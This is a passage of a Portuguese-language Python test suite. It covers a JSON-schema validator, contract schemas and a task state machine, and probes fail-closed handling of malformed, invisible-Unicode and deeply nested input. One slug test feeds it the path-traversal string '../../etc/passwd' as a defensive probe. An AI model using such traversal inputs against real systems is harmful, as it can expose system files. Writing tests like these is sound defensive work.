            (["inválido"], {"type": "array", "items": "deveria ser objeto"}),
            (["inválido"], {"type": "array", "items": [{"type": "string"}]}),
            ({"a": 1}, {"type": "object", "required": "deveria ser lista"}),
            ({"a": 1}, {"type": "object", "additionalProperties": {"type": "string"}}),
            ("x", {"type": "string", "minLength": "não é número"}),
            ("x", {"type": "string", "pattern": "["}),
            ("x", {"type": "inventado"}),
            ("x", "a definição inteira é texto"),
            ("x", None),
        )
        for dado, schema in casos:
            erros = validar_contra_schema(dado, schema)
            self.assertIsInstance(erros, list, schema)
            self.assertTrue(erros, f"definição quebrada passou batido: {schema!r}")
            for erro in erros:
                self.assertEqual(achar_ingles(motivo_do_erro(erro)), [], erro)

    def test_definicao_quebrada_em_ramo_nao_visitado(self):                 # A2
        # o campo de subdefinição quebrada nem aparece no documento: ainda assim reprova
        self.assertTrue(validar_contra_schema({}, {"type": "object", "properties": {"n": 123}}))

    def test_integer_aceita_numero_de_parte_fracionaria_zero(self):         # A3
        self.assertEqual(validar_contra_schema(1.0, {"type": "integer"}), [])
        self.assertEqual(validar_contra_schema(-3.0, {"type": "integer", "minimum": -5}), [])
        self.assertNotEqual(validar_contra_schema(1.5, {"type": "integer"}), [])
        self.assertNotEqual(validar_contra_schema(True, {"type": "integer"}), [])
        self.assertNotEqual(validar_contra_schema(float("inf"), {"type": "integer"}), [])
        self.assertNotEqual(validar_contra_schema(float("nan"), {"type": "integer"}), [])

    def test_const_e_enum_sobrevivem_ao_erro_de_tipo(self):                 # S1
        erros = ";".join(validar_contra_schema(1, {"type": "string", "const": "x",
                                                   "enum": ["y"]}))
        self.assertIn("esperava texto", erros)
        self.assertIn("exatamente", erros)
        self.assertIn("não está entre os aceitos", erros)

    def test_padrao_mal_escrito_nao_vaza_ingles(self):                      # S2
        erros = validar_contra_schema("x", {"type": "string", "pattern": "["})
        self.assertEqual(len(erros), 1)
        self.assertEqual(achar_ingles(motivo_do_erro(erros[0])), [])
        self.assertNotIn("position", erros[0])       # prosa do re.error não aparece

    def test_documento_fundo_demais_vira_erro_de_lista(self):              # S4
        dado, schema = [], {"type": "array"}
        for _ in range(400):
            dado, schema = [dado], {"type": "array", "items": schema}
        erros = validar_contra_schema(dado, schema)
        self.assertIsInstance(erros, list)
        self.assertTrue(erros)
        self.assertEqual(achar_ingles(motivo_do_erro(erros[-1])), [], erros[-1])

    def test_const_fundo_demais_nao_estoura(self):                          # S4
        valor = 0
        for _ in range(400):
            valor = [valor]
        self.assertIsInstance(validar_contra_schema(valor, {"const": valor}), list)

    def test_metavalidacao_alcanca_ramo_nao_visitado(self):                 # r2/A1
        # definição quebrada em campo ausente ou lista vazia não pode passar limpa
        casos = (
            ({}, {"type": "object", "properties": {"ausente": {"type": "inventado"}}}),
            ({}, {"type": "object", "properties": {"ausente": {"type": "string",
                                                               "pattern": "["}}}),
            ([], {"type": "array", "items": {"type": ["string", {}]}}),
            ([], {"type": "array", "items": {"type": "object", "properties": {
                "fundo": {"type": "array", "items": {"type": "inventado"}}}}}),
        )
        for dado, schema in casos:
            erros = validar_contra_schema(dado, schema)
            self.assertTrue(erros, f"ramo não visitado passou batido: {schema!r}")
            for erro in erros:
                self.assertEqual(achar_ingles(motivo_do_erro(erro)), [], erro)

    def test_type_em_lista_malformada_nao_lanca(self):                      # r2/A2
        for schema in ({"type": ["string", {}]}, {"type": []}, {"type": ["string", 3]},
                       {"type": ["inventado"]}, {"type": {"nem": "isto"}}):
            erros = validar_contra_schema("x", schema)
            self.assertIsInstance(erros, list, schema)
            self.assertTrue(erros, schema)

    def test_operador_desconhecido_reprova_com_sugestao(self):              # r2/A3
        erros = validar_contra_schema("", {"type": "string", "minLenght": 1})
        self.assertTrue(erros, "typo desativou a restrição em silêncio")
        self.assertIn("'minLenght'", erros[0])
        self.assertIn("minLength", erros[0])          # sugere o operador certo
        self.assertTrue(validar_contra_schema({}, {"type": "object", "requird": ["a"]}))
        self.assertEqual(achar_ingles(motivo_do_erro(erros[0])), [], erros[0])

    def test_anotacoes_de_definicao_sao_aceitas(self):
        # os arquivos da Task 3 trazem $schema/title/description e não são operadores
        definicao = {"$schema": "http://json-schema.org/draft-07/schema#",
                     "$id": "direcoes-v1", "title": "Direções", "description": "contrato",
                     "type": "object"}
        self.assertEqual(validar_contra_schema({}, definicao), [])

    def test_invariantes_semanticos_da_definicao(self):                     # r2/S4
        casos = ({"type": "string", "minLength": -1}, {"type": "array", "minItems": -1},
                 {"type": "number", "minimum": float("nan")},
                 {"type": "number", "maximum": float("inf")},
                 {"type": "integer", "minimum": 5, "maximum": 1},
                 {"type": "string", "minLength": 5, "maxLength": 2},
                 {"type": "array", "minItems": 3, "maxItems": 1}, {"enum": []})
        for schema in casos:
            self.assertTrue(validar_contra_schema(0, schema), f"restrição inerte: {schema}")

    def test_const_fundo_demais_vira_erro_de_profundidade(self):            # r2/S1
        valor = 0
        for _ in range(1500):
            valor = [valor]
        erros = validar_contra_schema(valor, {"const": valor})
        self.assertEqual(len(erros), 1)
        self.assertIn("aninhado demais", erros[0])
        self.assertEqual(achar_ingles(motivo_do_erro(erros[0])), [], erros[0])

    def test_truncamento_preserva_a_diferenca_no_fim(self):                 # r2/S2
        erro = validar_contra_schema("x" * 200 + "A", {"const": "x" * 200 + "B"})[0]
        self.assertIn("A", erro); self.assertIn("B", erro)

    def test_enum_longo_tem_teto_global(self):                              # r2/S2
        erro = validar_contra_schema(-1, {"enum": list(range(100))})[0]
        self.assertLess(len(erro), 400, erro)

    def test_citacao_com_aspas_duplas_tambem_sai(self):                     # r2/S3
        erro = validar_contra_schema("can't error", {"const": "x"})[0]
        self.assertEqual(achar_ingles(motivo_do_erro(erro)), [], erro)

    def test_nao_finito_no_documento_reprova(self):                         # r3/A1
        # as 4 regressões pedidas no parecer: NaN, +inf, -inf e 1e400 desserializado
        limites = {"type": "number", "minimum": 0, "maximum": 10}
        for valor in (float("nan"), float("inf"), float("-inf"), json.loads("1e400")):
            erros = validar_contra_schema(valor, limites)
            self.assertTrue(erros, f"não-finito burlou o limite: {valor}")
            self.assertEqual(achar_ingles(motivo_do_erro(erros[0])), [], erros[0])
        # dentro de objeto, inclusive em campo que a definição nem descreve
        documento = json.loads('{"custo": NaN, "solto": Infinity}')
        erros = validar_contra_schema(documento, {"type": "object", "properties": {
            "custo": {"type": "number", "minimum": 0, "maximum": 100}}})
        self.assertEqual(len(erros), 2, erros)
        self.assertIn("$.custo", erros[0]); self.assertIn("$.solto", erros[1])
        # e sem `type` declarado também reprova
        self.assertTrue(validar_contra_schema(float("nan"), {"minimum": 0}))

    def test_limite_inteiro_gigante_nao_estoura(self):                      # r3/S2
        erros = validar_contra_schema(5, {"type": "integer", "minimum": 10 ** 399})
        self.assertIsInstance(erros, list)
        self.assertTrue(erros)                       # 5 < 10**399: erro, não exceção
        self.assertLess(len(erros[0]), 400, "limite gigante despejado na mensagem")

    def test_forma_das_anotacoes_da_definicao(self):                        # r3/S1
        for definicao in ({"$schema": {}}, {"$id": 42}, {"title": []},
                          {"description": False}, {"$comment": 3}, {"examples": "x"}):
            self.assertTrue(validar_contra_schema({}, definicao), definicao)
        self.assertEqual(validar_contra_schema({}, {"$schema": "x", "$id": "y", "title": "t",
                                                    "description": "d"}), [])

    def test_mensagem_nao_despeja_documento_inteiro(self):
        erros = validar_contra_schema("x" * 5000, {"const": "y"})
        self.assertLess(len(erros[0]), 400, "mensagem gigante na cara do leigo")

class TestSchemas(unittest.TestCase):
    """Task 3: os 8 contratos `-v1`, os exemplos e o subcomando `validar`."""

    def test_todos_os_schemas_existem(self):
        self.assertEqual(len(SCHEMAS), 8, sorted(SCHEMAS))
        for versao, caminho in SCHEMAS.items():
            self.assertTrue(caminho.exists(), f"schema faltando: {caminho}")
            self.assertTrue(caminho.name.endswith("-v1.schema.json"), caminho.name)

    def test_schemas_passam_na_propria_metavalidacao(self):
        # o motor confere a si mesmo: definição quebrada num contrato reprova aqui
        for versao, caminho in SCHEMAS.items():
            erros = erros_de_definicao(json.loads(caminho.read_text(encoding="utf-8")))
            self.assertEqual(erros, [], f"{versao}: {erros}")

    def test_todo_contrato_exige_o_envelope_comum(self):
        for versao, caminho in SCHEMAS.items():
            definicao = json.loads(caminho.read_text(encoding="utf-8"))
            for campo in CAMPOS_DO_ENVELOPE:
                self.assertIn(campo, definicao.get("required", []),
                              f"{versao} não exige '{campo}' do envelope comum")

    def test_exemplos_validos_passam(self):
        exemplos = sorted(PASTA_DE_EXEMPLOS.joinpath("validos").glob("*.json"))
        self.assertGreaterEqual(len(exemplos), len(SCHEMAS), "falta exemplo válido")
        vistos = set()
        for arquivo in exemplos:
            dado = carregar_e_validar(arquivo)
            self.assertIsInstance(dado, dict, arquivo.name)
            vistos.add(dado["schema_version"])
        self.assertEqual(vistos, set(SCHEMAS), "há contrato sem exemplo válido")

    def test_exemplos_invalidos_reprovam(self):
        exemplos = sorted(PASTA_DE_EXEMPLOS.joinpath("invalidos").glob("*.json"))
        self.assertGreaterEqual(len(exemplos), len(SCHEMAS), "falta exemplo inválido")
        for arquivo in exemplos:
            saida = io.StringIO()
            with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
                carregar_e_validar(arquivo)
            self.assertEqual(ctx.exception.code, 1, arquivo.name)
            self.assertTrue(saida.getvalue().startswith("ERRO: "), arquivo.name)

    def test_fixtures_aprovadas_sao_a_autoridade_de_forma(self):
        for fixture in ("Prototypes/01-relatorio-direcoes.fixture.json",
                        "Prototypes/02-rodada-grill.fixture.json"):
            caminho = RAIZ_DO_PLUGIN / fixture
            if not caminho.exists():        # o pacote publicado não leva Prototypes/
                continue
            self.assertIsInstance(carregar_e_validar(caminho), dict, fixture)

    def test_regra_extra_fora_da_caixa(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        self.assertEqual(regras_extras(base), [])
        duas = json.loads(json.dumps(base))
        for direcao in duas["direcoes"][:2]:
            direcao["fora_da_caixa"] = True
        self.assertTrue(regras_extras(duas), "duas direções fora da caixa passaram")
        reais = json.loads(json.dumps(base))         # 5 direções, nenhuma fora da caixa
        modelo = reais["direcoes"][0]
        while len(reais["direcoes"]) < 5:
            copia = json.loads(json.dumps(modelo))
            copia["id"] = f"{modelo['id']}-{len(reais['direcoes'])}"
            copia["recomendada"] = False
            reais["direcoes"].append(copia)
        for direcao in reais["direcoes"]:
            direcao["fora_da_caixa"] = False
        self.assertTrue(regras_extras(reais), "mais de 4 direções reais passaram")

    def test_regra_extra_recomendada_unica_por_pergunta(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                          .read_text(encoding="utf-8"))
        self.assertEqual(regras_extras(base), [])
        sem = json.loads(json.dumps(base))
        for opcao in sem["perguntas"][0]["opcoes"]:
            opcao["recomendada"] = False
        self.assertTrue(regras_extras(sem), "pergunta sem opção recomendada passou")

    def test_regra_extra_aviso_de_irreversibilidade(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                          .read_text(encoding="utf-8"))
        mutante = json.loads(json.dumps(base))
        mutante["perguntas"][0]["reversivel"] = False
        mutante["perguntas"][0].pop("irreversivel_aviso", None)
        self.assertTrue(regras_extras(mutante), "irreversível sem aviso passou")

    def test_resposta_de_grill_exige_anotacoes(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-respostas.json")
                          .read_text(encoding="utf-8"))
        self.assertIn("anotacoes", base)
        sem = json.loads(json.dumps(base))
        del sem["anotacoes"]
        self.assertTrue(validar_contra_schema(sem, carregar_schema("grill-respostas-v1")))
        vazio = json.loads(json.dumps(base))
        vazio["anotacoes"] = []                      # lista vazia é aceita
        self.assertEqual(validar_contra_schema(vazio, carregar_schema("grill-respostas-v1")), [])

    def test_schema_desconhecido_ou_ausente_reprova(self):
        for documento in ({"tarefa_id": "x"}, {"schema_version": "inventado-v9"}):
            saida = io.StringIO()
            with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit):
                validar_documento_carregado(documento, "<memória>")
            self.assertEqual(achar_ingles(sem_citacoes(saida.getvalue())), [],
                             saida.getvalue())

    def test_cli_despacha_validar_para_cmd_validar(self):     # obrigação da Task 1
        args = construir_parser().parse_args(["validar", "c.json"])
        self.assertIs(args.func, cmd_validar)
        valido = PASTA_DE_EXEMPLOS / "validos" / "objetivo.json"
        saida = io.StringIO()
        with contextlib.redirect_stdout(saida):
            main(["validar", str(valido)])            # sem SystemExit: contrato válido
        self.assertIn("válido", saida.getvalue())
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit) as ctx:
            main(["validar", str(PASTA_DE_EXEMPLOS / "invalidos" / "objetivo.json")])
        self.assertEqual(ctx.exception.code, 1)

    def test_arquivo_inexistente_e_json_quebrado(self):
        for alvo in (RAIZ_DO_PLUGIN / "nao-existe.json",
                     PASTA_DE_EXEMPLOS / "invalidos" / "json-quebrado.json"):
            saida = io.StringIO()
            with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit):
                carregar_e_validar(alvo)
            self.assertEqual(achar_ingles(sem_citacoes(saida.getvalue())), [],
                             saida.getvalue())

class TestContratosFailClosed(unittest.TestCase):
    """Disposição da rodada 1 da Task 3 (pareceres A e B, convergentes)."""

    @staticmethod
    def _valido(nome):
        return json.loads((PASTA_DE_EXEMPLOS / "validos" / nome).read_text(encoding="utf-8"))

    def _reprova(self, documento, pista=""):
        """Valida em memória e devolve a saída de erro, exigindo exit 1 e PT-BR."""
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            validar_documento_carregado(documento, "<memória>")
        self.assertEqual(ctx.exception.code, 1, pista)
        texto = saida.getvalue()
        self.assertTrue(texto.startswith("ERRO: "), texto[:200])
        self.assertNotIn("Traceback", texto)
        self.assertEqual(achar_ingles(sem_citacoes(texto)), [], texto)
        return texto

    def test_identificador_de_tipo_errado_nao_derruba(self):                 # P1/1
        casos = (("direcoes.json", ["direcoes", 0, "id"]),
                 ("grill-rodada.json", ["perguntas", 0, "id"]),
                 ("grill-rodada.json", ["perguntas", 0, "opcoes", 0, "id"]),
                 ("grill-respostas.json", ["respostas", 0, "pergunta_id"]),
                 ("decisao-direcoes.json", ["anotacoes", 0, "id"]))
        for nome, caminho in casos:
            for valor_ruim in ([], {}, 7):
                documento = self._valido(nome)
                alvo = documento
                for chave in caminho[:-1]:
                    alvo = alvo[chave]
                alvo[caminho[-1]] = valor_ruim
                self._reprova(documento, f"{nome}:{caminho}={valor_ruim!r}")
                # a função pública também não pode estourar sozinha
                self.assertIsInstance(regras_extras(documento), list)

    def test_substituto_unicode_isolado_reprova_sem_rastro(self):
        documento = self._valido("grill-rodada.json")
        documento["perguntas"][0]["id"] = json.loads(r'"\ud800"')
        erro = self._reprova(documento, "substituto Unicode isolado")
        self.assertIn("Unicode", erro)
        self.assertIn("U+D800", erro)

        nome_de_campo = json.loads(r'"\udfff"')
        documento = self._valido("grill-rodada.json")
        documento[nome_de_campo] = "campo hostil"
        erro = self._reprova(documento, "substituto no nome de campo")
        self.assertIn("U+DFFF", erro)

        documento = self._valido("grill-rodada.json")
        documento["perguntas"][0]["id"] = json.loads(r'"\ud800"')
        documento["perguntas"][1]["id"] = json.loads(r'"\ud800"')
        bruto = io.BytesIO()
        saida_utf8 = io.TextIOWrapper(bruto, encoding="utf-8", errors="strict")
        with contextlib.redirect_stderr(saida_utf8), self.assertRaises(SystemExit) as ctx:
            validar_documento_carregado(documento, "<memória>")
        saida_utf8.flush()
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn(b"U+D800", bruto.getvalue())

    def test_json_aninhado_demais_nao_derruba(self):                         # P1/1
        with tempfile.TemporaryDirectory() as pasta:
            arquivo = Path(pasta) / "fundo.json"
            arquivo.write_text("[" * 2000 + "]" * 2000, encoding="utf-8")
            saida = io.StringIO()
            with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
                carregar_e_validar(arquivo)
            self.assertEqual(ctx.exception.code, 1)
            self.assertNotIn("Traceback", saida.getvalue())
            self.assertIn("aninhado", saida.getvalue())
            self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(
            saida.getvalue()))), [], saida.getvalue())

    def test_rastreabilidade_em_branco_reprova(self):                        # P1/2
        for campo in ("modelo", "sessao_id", "transcript_jsonl", "agente"):
            documento = self._valido("objetivo.json")
            documento["produzido_por"][campo] = "   "
            self.assertIn(campo, self._reprova(documento, campo))
        aceito = self._valido("objetivo.json")
        for campo in ("modelo", "sessao_id", "transcript_jsonl"):
            aceito["produzido_por"][campo] = NAO_DETERMINAVEL
        self.assertEqual(validar_documento_carregado(aceito, "<memória>"), aceito)

    def test_texto_obrigatorio_em_branco_reprova(self):                      # P1/2 e P2/7
        grill = self._valido("grill-rodada.json")
        for pergunta in grill["perguntas"]:
            if pergunta["reversivel"] is False:
                pergunta["irreversivel_aviso"] = "   "
        self.assertIn("irreversivel_aviso", self._reprova(grill, "aviso em branco"))
        objetivo = self._valido("objetivo.json")
        objetivo["objetivo_confirmado"] = "      "
        self.assertIn("objetivo_confirmado", self._reprova(objetivo, "objetivo em branco"))
        anotada = self._valido("decisao-direcoes.json")
        anotada["anotacoes"][0]["trecho"] = " "
        self.assertIn("trecho", self._reprova(anotada, "trecho em branco"))

    def test_decisao_concluida_exige_direcao_escolhida(self):                # P1/3
        for valor in (None, "   "):
            documento = self._valido("decisao-direcoes.json")
            documento["estado"] = "decidida"
            documento["direcao_escolhida"] = valor
            self.assertIn("direcao_escolhida", self._reprova(documento, repr(valor)))
        sem_campo = self._valido("decisao-direcoes.json")
        sem_campo["estado"] = "decidida"
        del sem_campo["direcao_escolhida"]
        self.assertIn("direcao_escolhida", self._reprova(sem_campo, "campo ausente"))
        # o inverso também precisa ser coerente: pendente não decidiu nada
        pendente = self._valido("decisao-direcoes.json")
        pendente["estado"] = "pendente"
        self.assertIn("direcao_escolhida", self._reprova(pendente, "pendente com escolha"))

    def test_cobertura_suficiente_exige_zero_duvidas(self):                  # P1/4
        com_duvidas = self._valido("grill-consolidado.json")
        com_duvidas["cobertura"]["duvidas_pendentes"] = 3
        self.assertIn("duvidas_pendentes", self._reprova(com_duvidas, "suficiente com dúvidas"))
        com_lacunas = self._valido("grill-consolidado.json")
        com_lacunas["cobertura"]["lacunas"] = ["falta combinar o que é obrigatório"]
        self.assertIn("lacunas", self._reprova(com_lacunas, "suficiente com lacuna"))
        sem_contagem = self._valido("grill-consolidado.json")
        del sem_contagem["cobertura"]["duvidas_pendentes"]
        self._reprova(sem_contagem, "veredito sem contagem de dúvidas")
        nova_rodada = self._valido("grill-consolidado.json")
        nova_rodada["cobertura"] = {"veredito": "NOVA RODADA", "por_quem": "avaliador-de-cobertura",
                                    "lacunas": [], "duvidas_pendentes": 2}
        self.assertIn("lacunas", self._reprova(nova_rodada, "nova rodada sem lacuna nomeada"))

    def test_criterio_de_integracao_agentica_e_obrigatorio(self):            # P2/5
        documento = self._valido("direcoes.json")
        documento["criterios"] = [c for c in documento["criterios"] if c["id"] != "agentica"]
        self.assertIn("agentica", self._reprova(documento, "sem critério agêntico"))

    def test_resposta_aprovada_exige_escolha(self):                          # P2/6
        aprovada = self._valido("grill-respostas.json")
        aprovada["respostas"][0]["escolha_id"] = None
        self.assertIn("escolha_id", self._reprova(aprovada, "aprovada sem escolha"))
        sem_campo = self._valido("grill-respostas.json")
        del sem_campo["respostas"][0]["escolha_id"]
        self.assertIn("escolha_id", self._reprova(sem_campo, "aprovada sem o campo"))
        pendente = self._valido("grill-respostas.json")
        pendente["respostas"][0]["estado"] = "pendente"
        self.assertIn("escolha_id", self._reprova(pendente, "pendente com escolha"))
        # dúvida sem texto continua válida (a spec permite deixar em branco)
        duvida = self._valido("grill-respostas.json")
        duvida["respostas"][1]["duvida_texto"] = ""
        self.assertEqual(validar_documento_carregado(duvida, "<memória>"), duvida)

class TestConteudoInvisivel(unittest.TestCase):
    """Rodada 2: campo "preenchido" só com caractere invisível é campo vazio.
    A regra é por categoria Unicode — lista de codepoints sempre deixa o próximo de fora."""

    # Os 4 codepoints do parecer, mais invisíveis de outras faixas das mesmas
    # categorias. Escritos como escape de propósito: o literal quebraria este
    # arquivo (SyntaxError: invalid non-printable character) — o que já diz muito
    # sobre o estrago que eles fazem passando por "conteúdo".
    INVISIVEIS = (
        "\u200b",       # ZERO WIDTH SPACE (Cf) — sonda do parecer
        "\u2060",       # WORD JOINER (Cf) — sonda do parecer
        "\ufeff",       # ZERO WIDTH NO-BREAK SPACE / BOM (Cf) — sonda do parecer
        "\u0000",       # NUL (Cc) — sonda do parecer
        "\u00ad",       # SOFT HYPHEN (Cf) — fora da lista do parecer
        "\u2061",       # FUNCTION APPLICATION (Cf) — fora da lista do parecer
        "\u061c",       # ARABIC LETTER MARK (Cf) — fora da lista do parecer
        "\U000e0001",   # LANGUAGE TAG (Cf) — plano suplementar
        "\u0007", "\u001f",              # Cc
        "\u00a0", "\u2028", "\u2029", "\u3000",   # Zs, Zl, Zp, Zs
    )

    @staticmethod
    def _valido(nome):
        return json.loads((PASTA_DE_EXEMPLOS / "validos" / nome).read_text(encoding="utf-8"))

    def _reprova(self, documento, pista):
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            validar_documento_carregado(documento, "<memória>")
        self.assertEqual(ctx.exception.code, 1, pista)
        self.assertNotIn("Traceback", saida.getvalue())
        return saida.getvalue()

    def test_regra_vale_para_a_categoria_inteira(self):
        # varre o plano multilíngue básico e os suplementares: TODO caractere das
        # categorias sem conteúdo precisa contar como vazio, não só os citados.
        conferidos = 0
        for ponto in range(0x11000):
            caractere = chr(ponto)
            if unicodedata.category(caractere) in CATEGORIAS_SEM_CONTEUDO:
                conferidos += 1
                self.assertTrue(_em_branco(caractere), f"U+{ponto:04X} passou como conteúdo")
        self.assertGreater(conferidos, 100, "a varredura precisa cobrir a categoria toda")
        self.assertFalse(_em_branco("a"))                      # conteúdo de verdade sobrevive
        self.assertFalse(_em_branco(" 3 "))
        self.assertEqual(conteudo_visivel("\u00a0 a\u200bb\u00ad\u2028"), "ab")

    def test_rastreabilidade_invisivel_reprova(self):
        for invisivel in self.INVISIVEIS:
            documento = self._valido("objetivo.json")
            documento["produzido_por"]["transcript_jsonl"] = invisivel * 3
            self.assertIn("transcript_jsonl", self._reprova(documento, repr(invisivel)))

    def test_texto_obrigatorio_invisivel_reprova(self):
        for invisivel in self.INVISIVEIS:
            documento = self._valido("objetivo.json")
            documento["objetivo_confirmado"] = invisivel
            self.assertIn("objetivo_confirmado", self._reprova(documento, repr(invisivel)))

    def test_direcao_escolhida_invisivel_reprova(self):
        for invisivel in self.INVISIVEIS:
            documento = self._valido("decisao-direcoes.json")
            documento["estado"] = "decidida"
            documento["direcao_escolhida"] = invisivel
            self.assertIn("direcao_escolhida", self._reprova(documento, repr(invisivel)))

    def test_escolha_aprovada_invisivel_reprova(self):
        for invisivel in self.INVISIVEIS:
            documento = self._valido("grill-respostas.json")
            documento["respostas"][0]["escolha_id"] = invisivel
            self.assertIn("escolha_id", self._reprova(documento, repr(invisivel)))

    def test_aviso_irreversivel_invisivel_reprova(self):
        for invisivel in self.INVISIVEIS:
            documento = self._valido("grill-rodada.json")
            for pergunta in documento["perguntas"]:
                if pergunta["reversivel"] is False:
                    pergunta["irreversivel_aviso"] = invisivel
            self.assertIn("irreversivel_aviso", self._reprova(documento, repr(invisivel)))

    def test_export_de_grill_exige_as_chaves_canonicas(self):     # r2/3
        for campo in ("comentario", "duvida_texto", "escolha_id"):
            documento = self._valido("grill-respostas.json")
            del documento["respostas"][0][campo]
            self.assertIn(campo, self._reprova(documento, f"sem a chave {campo}"))
        # a chave precisa existir; o conteúdo pode ser vazio (spec §8)
        vazio = self._valido("grill-respostas.json")
        vazio["respostas"][0]["comentario"] = ""
        vazio["respostas"][1]["duvida_texto"] = ""
        self.assertEqual(validar_documento_carregado(vazio, "<memória>"), vazio)

    def test_criterio_agentico_precisa_ser_sempre_presente(self):  # r2/2
        for valor in (False, None, "sim"):
            documento = self._valido("direcoes.json")
            for criterio in documento["criterios"]:
                if criterio["id"] == CRITERIO_AGENTICO:
                    criterio["sempre_presente"] = valor
            self.assertIn("sempre_presente", self._reprova(documento, repr(valor)))
        sem_marcador = self._valido("direcoes.json")
        for criterio in sem_marcador["criterios"]:
            if criterio["id"] == CRITERIO_AGENTICO:
                del criterio["sempre_presente"]
        self.assertIn("sempre_presente", self._reprova(sem_marcador, "marcador ausente"))

    def test_criterios_com_identificador_repetido_reprovam(self):
        documento = self._valido("direcoes.json")
        documento["criterios"].append(json.loads(json.dumps(documento["criterios"][0])))
        self.assertIn("$.criterios", self._reprova(documento, "critério repetido"))

class TestTarefa(unittest.TestCase):
    """Task 4: `nova-tarefa`, `status` e `concluir-etapa` — a máquina de estados."""

    OBJETIVO = "Lançar apartamentos do Stay pelo chat"
    DATA = "2026-08-20"

    def setUp(self):
        self._temp = tempfile.TemporaryDirectory()
        self.raiz = Path(self._temp.name)
        self.addCleanup(self._temp.cleanup)

    def _cria(self, objetivo=None, data=None):
        return criar_tarefa(self.raiz, objetivo or self.OBJETIVO, data or self.DATA)

    def _grava_contrato(self, pasta, destino, exemplo, ajustes=None):
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo).read_text(encoding="utf-8"))
        dado["tarefa_id"] = carregar_tarefa(pasta)["tarefa_id"]
        for chave, valor in (ajustes or {}).items():
            dado[chave] = valor
        if "contrato_sha256" not in (ajustes or {}):
            carimbar_resposta_de_teste(dado, pasta)
        alvo = pasta / destino
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")
        return alvo

    def _reprova(self, funcao, *args, **kwargs):
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            funcao(*args, **kwargs)
        self.assertEqual(ctx.exception.code, 1)
        self.assertNotIn("Traceback", saida.getvalue())
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(
            saida.getvalue()))), [], saida.getvalue())
        return saida.getvalue()

    def test_cria_a_estrutura_completa(self):
        pasta = self._cria()
        self.assertEqual(pasta.name, "lancar-apartamentos-do-stay-pelo-chat-2026-08-20")
        for sub in ("contratos", "html", "respostas", "pesquisas"):
            self.assertTrue((pasta / sub).is_dir(), sub)
        tarefa = carregar_e_validar(pasta / "tarefa.json")     # valida contra tarefa-v1
        self.assertEqual(tarefa["etapa"], "criada")
        self.assertEqual(tarefa["tarefa_id"], pasta.name)
        self.assertEqual(len(tarefa["historico"]), 1)
        self.assertEqual(tarefa["historico"][0]["etapa"], "criada")

    def test_slug_sem_acento_sem_simbolo_e_sem_escapar_da_pasta(self):
        self.assertEqual(slugificar("Lançar apartamentos do Stay!"), "lancar-apartamentos-do-stay")
        self.assertEqual(slugificar("../../etc/passwd"), "etc-passwd")
        self.assertEqual(slugificar("  ÁÉÍÓÚ  ção  "), "aeiou-cao")
        self.assertTrue(slugificar("!!!").startswith("tarefa"))   # nunca fica vazio

    def test_nao_sobrescreve_tarefa_existente(self):
        self._cria()
        self._reprova(self._cria)

    def test_status_mostra_etapa_pendencia_e_proxima_acao(self):
        pasta = self._cria()
        texto = resumo_da_tarefa(pasta)
        self.assertIn("criada", texto)
        self.assertIn(self.OBJETIVO, texto)
        self.assertIn("objetivo-confirmado", texto)          # o que falta
        self.assertIn("concluir-etapa", texto)               # próxima ação
        self.assertEqual(achar_ingles(sem_citacoes(texto)), [], texto)

    def test_avancar_sem_contrato_reprova(self):
        pasta = self._cria()
        saida = self._reprova(avancar_etapa, pasta, "objetivo-confirmado", data=self.DATA)
        self.assertIn("01-objetivo.json", saida)
        self.assertEqual(carregar_tarefa(pasta)["etapa"], "criada")   # não mexeu no estado

    def test_avancar_com_contrato_valido(self):
        pasta = self._cria()
        self._grava_contrato(pasta, "contratos/01-objetivo.json", "objetivo.json")
        avancar_etapa(pasta, "objetivo-confirmado", data=self.DATA)
        tarefa = carregar_e_validar(pasta / "tarefa.json")
        self.assertEqual(tarefa["etapa"], "objetivo-confirmado")
        self.assertEqual(len(tarefa["historico"]), 2)
        self.assertEqual(tarefa["historico"][-1]["contrato"], "contratos/01-objetivo.json")

    def test_avancar_pulando_etapa_reprova(self):
        pasta = self._cria()
        self._grava_contrato(pasta, "contratos/02-pesquisa.json", "pesquisa.json")
        saida = self._reprova(avancar_etapa, pasta, "pesquisa-concluida", data=self.DATA)
        self.assertIn("objetivo-confirmado", saida)          # nomeia a etapa que falta

    def test_avancar_para_tras_ou_repetir_reprova(self):
        pasta = self._cria()
        self._grava_contrato(pasta, "contratos/01-objetivo.json", "objetivo.json")
        avancar_etapa(pasta, "objetivo-confirmado", data=self.DATA)
        self._reprova(avancar_etapa, pasta, "criada", data=self.DATA)
        self._reprova(avancar_etapa, pasta, "objetivo-confirmado", data=self.DATA)

    def test_etapa_inexistente_reprova_com_sugestao(self):
        pasta = self._cria()
        saida = self._reprova(avancar_etapa, pasta, "objetivo-confirmada", data=self.DATA)
        self.assertIn("objetivo-confirmado", saida)          # sugere a etapa certa

    def test_contrato_invalido_ou_de_outra_tarefa_reprova(self):
        pasta = self._cria()
        alvo = self._grava_contrato(pasta, "contratos/01-objetivo.json", "objetivo.json")
        quebrado = json.loads(alvo.read_text(encoding="utf-8"))
        quebrado["confirmado_pelo_usuario"] = False
        alvo.write_text(json.dumps(quebrado, ensure_ascii=False), encoding="utf-8")
        self._reprova(avancar_etapa, pasta, "objetivo-confirmado", data=self.DATA)
